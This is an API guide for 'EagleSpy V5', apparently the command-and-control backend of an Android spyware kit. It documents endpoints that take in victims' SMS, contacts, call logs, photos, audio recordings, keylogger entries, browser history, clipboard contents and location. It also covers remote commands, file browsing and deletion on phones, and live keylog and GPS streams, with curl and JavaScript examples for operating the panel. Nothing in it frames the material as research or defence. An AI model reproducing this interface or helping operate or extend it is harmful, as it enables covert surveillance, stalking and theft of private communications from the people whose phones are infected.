# EagleSpy V5 — API Guide

## Overview

EagleSpy exposes a **REST API** for device management and data ingestion, a
**GraphQL** endpoint for flexible queries, and **ActionCable WebSocket** channels
for real-time communication. The full OpenAPI 3.0 specification lives in
[`openapi.yaml`](openapi.yaml).

---

## Authentication

### Device Authentication (`X-Device-Token`)

Every request from an Android device must include the shared token:

```
X-Device-Token: <value of DEVICE_AUTH_TOKEN env var>
```

Optionally, devices may also send an HMAC-SHA256 signature for tamper-proof
requests:

| Header               | Description                                      |
|----------------------|--------------------------------------------------|
| `X-Device-Token`     | Shared secret (required)                         |
| `X-Device-Signature` | HMAC-SHA256 of the request body using the token   |
| `X-Device-Timestamp` | Unix epoch seconds; server allows ±300 s skew     |

### Admin Authentication (Session Cookie)

Admin users authenticate via the Devise login page at `/admin/login`.
After login, a `_android_spyware_session` cookie is set and must
accompany all subsequent requests.

```bash
# Example: login and capture cookie
curl -c cookies.txt -X POST http://localhost:8080/admin/login \
  -d 'admin_user[email]=admin@eaglespy.local' \
  -d 'admin_user[password]=YOUR_PASSWORD'

# Use cookie for subsequent requests
curl -b cookies.txt http://localhost:8080/api/devices/online
```

---

## Rate Limiting

Rate limiting is enforced by **Rack::Attack** middleware:

| Scope          | Limit               | Window  |
|----------------|----------------------|---------|
| API endpoints  | 300 requests         | 5 min   |
| Login attempts | 5 attempts           | 20 min  |
| Device uploads | 60 requests          | 1 min   |

Exceeding the limit returns `429 Too Many Requests` with a `Retry-After`
header.

---

## REST API Quick Reference

### Health

| Method | Path             | Description          |
|--------|------------------|----------------------|
| GET    | `/health`        | Overall status       |
| GET    | `/health/ready`  | Readiness probe      |
| GET    | `/health/live`   | Liveness probe       |

### Device Management

| Method | Path                                     | Description               |
|--------|------------------------------------------|---------------------------|
| GET    | `/api/devices/online`                    | List online devices       |
| GET    | `/api/config`                            | Device config + TURN      |
| POST   | `/api/commands/{device_id}`              | Poll pending commands     |
| POST   | `/api/commands/{device_id}/ack`          | Acknowledge command       |
| POST   | `/api/commands/{device_id}/send_command` | Send command to device    |

### Data Ingestion (device → server)

| Method | Path                  | Description             |
|--------|-----------------------|-------------------------|
| POST   | `/api/sms`            | SMS dump                |
| POST   | `/api/contacts`       | Contacts dump           |
| POST   | `/api/calls`          | Call logs dump          |
| POST   | `/api/photos`         | Photo upload            |
| POST   | `/api/audio`          | Audio recording upload  |
| POST   | `/api/clipboard`      | Clipboard content       |
| POST   | `/api/app_usage`      | App usage data          |
| POST   | `/api/browser_history`| Browser history         |
| POST   | `/api/keylogger`      | Keylog entries          |
| POST   | `/api/location`       | Location update         |
| POST   | `/api/geofence`       | Geofence breach event   |
| POST   | `/api/notifications`  | Notification capture    |

### File Browser

| Method | Path                                    | Description        |
|--------|-----------------------------------------|--------------------|
| GET    | `/api/smartphones/{id}/files`           | List files         |
| GET    | `/api/smartphones/{id}/files/download`  | Download file      |
| POST   | `/api/smartphones/{id}/files/upload`    | Upload file        |
| DELETE | `/api/smartphones/{id}/files`           | Delete file        |
| GET    | `/api/smartphones/{id}/files/preview`   | Preview file       |
| POST   | `/api/smartphones/{id}/files/rename`    | Rename file        |
| POST   | `/api/smartphones/{id}/files/move`      | Move file          |
| GET    | `/api/smartphones/{id}/files/search`    | Search files       |

### Chunked Uploads

| Method | Path                                  | Description              |
|--------|---------------------------------------|--------------------------|
| POST   | `/file_transfers/upload_chunk`        | Upload chunk             |
| POST   | `/file_transfers/finalize_upload`     | Finalize chunked upload  |
| POST   | `/file_transfers/cleanup_expired_uploads` | Clean expired uploads |

### GraphQL

```bash
curl -b cookies.txt -X POST http://localhost:8080/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query": "{ devices { id name batteryLevel } }"}'
```

---

## WebSocket / ActionCable

Connect to `ws://<host>/cable` using the ActionCable JS client or any
WebSocket client that speaks the ActionCable protocol.

### Connection

```javascript
import { createConsumer } from "@rails/actioncable"
const cable = createConsumer("ws://localhost:8080/cable")
```

### Channels

#### CommandChannel
Real-time command dispatch and device responses.

```javascript
cable.subscriptions.create(
  { channel: "CommandChannel", device_id: "abc123" },
  {
    received(data) { console.log("Command response:", data) },
    sendCommand(cmd, params) {
      this.perform("send_command", { command: cmd, params: params })
    }
  }
)
```

#### SignalingChannel
WebRTC SDP offer/answer exchange and ICE candidate relay.

```javascript
cable.subscriptions.create(
  { channel: "SignalingChannel", device_id: "abc123", is_admin: "true" },
  {
    received(data) {
      if (data.type === "offer") { /* handle SDP offer */ }
      if (data.type === "ice_candidate") { /* handle ICE */ }
    },
    answer(sdp) { this.perform("answer", { sdp: sdp }) },
    iceCandidate(candidate) {
      this.perform("ice_candidate", { candidate: candidate })
    }
  }
)
```

#### LocationChannel
Live GPS updates from devices.

```javascript
cable.subscriptions.create(
  { channel: "LocationChannel", device_id: "abc123" },
  {
    received(data) { updateMap(data.latitude, data.longitude) },
    watchDevice() { this.perform("watch_device") }
  }
)
```

#### KeylogChannel
Broadcasts keylog entries in real-time.

```javascript
cable.subscriptions.create(
  { channel: "KeylogChannel" },
  { received(data) { appendKeylog(data) } }
)
```

#### StatisticsChannel
Device statistics push updates.

```javascript
cable.subscriptions.create(
  { channel: "StatisticsChannel", device_id: "abc123" },
  {
    received(data) { updateDashboard(data) },
    requestUpdate() { this.perform("request_update") }
  }
)
```

---

## Error Responses

All errors follow a consistent JSON format:

```json
{
  "error": "Not Found",
  "message": "Device not found: abc123"
}
```

| HTTP Code | Meaning                        |
|-----------|--------------------------------|
| 400       | Bad Request (validation error) |
| 401       | Unauthorized (missing/invalid auth) |
| 404       | Resource not found             |
| 422       | Unprocessable Entity           |
| 429       | Rate limited                   |
| 500       | Internal server error          |

---

## Further Reading

- [OpenAPI Spec](openapi.yaml) — full machine-readable API spec
- [Security Setup](../SECURITY_SETUP.md) — credential generation
- [Architecture Decision Records](../adr/) — design rationale
- [Deployment Runbook](../runbooks/deployment.md) — production deployment
